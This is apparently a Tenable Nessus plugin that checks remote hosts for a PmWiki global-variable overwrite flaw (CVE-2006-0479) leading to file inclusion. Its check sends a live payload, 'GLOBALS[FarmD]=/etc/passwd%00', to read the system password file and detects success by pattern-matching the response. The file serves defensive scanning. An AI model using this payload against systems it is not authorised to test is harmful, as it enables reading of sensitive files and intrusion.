#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running PmWiki, an open-source Wiki written in PHP. 

The version of PmWiki installed on the remote host allows attackers to
overwrite global variables if run under PHP 5 with 'register_globals'
enabled.  For example, an attacker can exploit this issue to overwrite
the 'FarmD' variable before it's used in a PHP 'include()' function in
the 'pmwiki.php' script, which can allow him to view arbitrary files
on the remote host and even execute arbitrary PHP code, possibly taken
from third-party hosts. 

See also :

http://www.ush.it/2006/01/24/pmwiki-multiple-vulnerabilities/
http://lists.grok.org.uk/pipermail/full-disclosure/2006-January/041820.html
http://www.pmichaud.com/pipermail/pmwiki-announce/2006-January/000091.html

Solution : 

Upgrade to PmWiki 2.1 beta 21 or later.

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description) {
  script_id(20891);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0479");
  script_bugtraq_id(16421);

  script_name(english:"PmWiki < 2.1 beta 21 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in PmWiki < 2.1 beta 21");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/pmwiki", "/wiki", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/pmwiki.php?",
      "GLOBALS[FarmD]=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(/etc/passwd\\0/scripts/stdconfig\.php.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening '/etc/passwd\\0/scripts/stdconfig\.php' for inclusion")
  ) {
    if (report_verbosity > 1) {
      output = res - strstr(res, "<!DOCTYPE html");
      if (isnull(output)) output = res;

      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        output
      );
    }
    else report = desc;

    security_note(port:port, data:report);
    exit(0);
  }
}


